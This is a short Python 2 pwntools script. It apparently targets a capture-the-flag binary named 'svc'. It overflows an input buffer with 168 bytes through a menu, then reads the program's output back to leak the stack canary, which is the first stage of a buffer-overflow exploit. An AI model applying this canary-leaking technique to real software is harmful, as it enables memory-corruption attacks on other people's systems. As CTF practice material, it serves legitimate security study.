from pwn import *

target = process("./svc");
gdb.attach(target)


target.recvuntil(">>");

target.sendline("1");

print target.recvuntil(">>");

payload = 168*"0"

target.sendline(payload);

print target.recvuntil(">>")
target.sendline("2");

print target.recvuntil("[*]PLEASE TREAT HIM WELL.....\n")
print target.recvline()
print target.recvline()

leak = target.recvline()
leak = u64(leak[0:6]+"\x00"*(8 - len(leak[0:6])))

log.info("The stack canary is: " + hex(leak))

target.interactive();